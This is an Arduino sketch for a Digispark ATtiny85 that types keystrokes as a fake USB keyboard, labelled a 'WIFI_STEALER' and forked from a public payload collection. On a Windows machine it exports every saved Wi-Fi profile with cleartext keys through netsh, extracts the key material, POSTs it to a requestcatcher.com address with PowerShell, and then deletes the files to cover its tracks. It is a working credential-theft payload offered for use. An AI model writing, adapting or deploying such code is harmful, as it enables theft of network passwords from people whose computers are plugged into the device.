//////////////////
// MAKERSUN.NET //
// WIFI_STEALER //
//   050423     //
//////////////////
//
/*
 * Forked and modifyed from:
 * https://github.com/MTK911/Attiny85/blob/master/payloads/Wi-Fi%20password%20stealer/Wifikey-Grab.ino
 * 
 * Global variables reduced to 345 byte for a working WS2812B
 * 
 * Used requestcatcher instead of weebhook for bytesaving!!!
 * On requestcatcher use max 5 digit name
 * 
*/
#define LAYOUT_ITALIAN //change layout on your needs
#include "DigiKeyboard.h"
#include <Adafruit_NeoPixel.h>
//
// LED on PB0
#define LED            0
// WS2812B on PB1
#define PIN            1
#define NUMPIXELS      1
// insert your own requestcatcher site
char powerShell[] = "powershell Invoke-WebRequest -Uri https://xxxxx.requestcatcher.com/ -Me POST -I Wi-";
char command1[] = "cd %temp% && netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Patt 'keyMaterial' > Wi-";
//
Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_RGB + NEO_KHZ800);
//
void setup() {
  pinMode(LED, OUTPUT);
  pixels.begin();
  pixels.setBrightness(255);
  pixels.setPixelColor(0, pixels.Color(0, 150, 0));
  pixels.show();
}
//
void loop() {
  DigiKeyboard.delay(6000); 
  digitalWrite(LED, HIGH); //turn led on when start
  DigiKeyboard.delay(500);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  //DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println(command1);
  DigiKeyboard.delay(2000);  
  DigiKeyboard.println(powerShell);
  DigiKeyboard.delay(2000); 
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  digitalWrite(LED, LOW);  //turn off when finish
  DigiKeyboard.delay(1000);
  //
  while (true){
    pixels.setPixelColor(0, pixels.Color(random(0,255), random(0,255), random(0,255))); //MAKE SOME COLORS !!!
    pixels.show();
    DigiKeyboard.delay(200);
  }
}
